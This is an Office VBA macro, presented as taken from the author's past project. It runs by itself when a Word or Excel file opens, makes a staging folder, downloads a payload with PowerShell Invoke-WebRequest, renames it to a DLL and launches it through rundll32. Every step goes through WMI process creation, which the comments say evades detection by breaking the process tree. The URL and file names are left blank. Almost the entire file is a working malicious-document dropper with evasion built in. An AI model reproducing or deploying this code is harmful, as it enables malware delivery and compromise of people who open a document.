'Example taking from a previous project of mine for using office VBA to automatically run a macro upon opening of the file.
'This will make a folder for staging, download a payload, and then run the payload.
'All of the above actions are done with WMI evasion to break the process tree and will be called with WMIPrvSE.exe with no direct link to the office document causing this.

Public alreadyLaunched As Integer
Public Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)

Public path1 As String
Public stage1url As String
Public downloadtxt As String
Public dllname As String
Public mainfunc As String
Public rename As String
Public createproc As String

Sub vars()
    path1 = ""
    dllname = ""
    mainfunc = ""
	stage1url = ""
    downloadtxt = "powershell.exe Invoke-WebRequest stage1url -OutFile " + path1 + "\" + dllname + ".txt;"
    rename = "powershell.exe move " + path1 + "\" + dllname + ".txt " + path1 + "\" + dllname + ".dll"
    createproc = "C:\Windows\System32\rundll32.exe " + path1 + "\" + dllname + ".dll," + mainfunc
End Sub

Sub makefolder()
    Set Wmix = GetObject("winmgmts:\\.\root\cimv2")
    Set Procx = Wmix.Get("Win32_Process")
    Procx.Create ("powershell.exe mkdir " + path1)
End Sub

Sub Download()
    Set Wmiz = GetObject("winmgmts:\\.\root\cimv2")
    Set Proc = Wmiz.Get("Win32_Process")
    Proc.Create (downloadtxt)
End Sub

Sub Run()
    Set Wmizz = GetObject("winmgmts:\\.\root\cimv2")
    Set Procz = Wmizz.Get("Win32_Process")
    Procz.Create (createproc)
End Sub

Private Sub Launch()
    If alreadyLaunched = True Then
        Exit Sub
    End If
    vars
    Sleep (1000)
    makefolder
    Sleep (3000)
    Download
    Sleep (30000)
    Run
    alreadyLaunched = True
End Sub

Sub AutoOpen()
    ' Becomes launched as first on MS Word
    Launch
End Sub

Sub Document_Open()
    ' Becomes launched as second, another try, on MS Word
    Launch
End Sub

Sub Auto_Open()
    ' Becomes launched as first on MS Excel
    Launch
End Sub

Sub Workbook_Open()
    ' Becomes launched as second, another try, on MS Excel
    Launch
End Sub
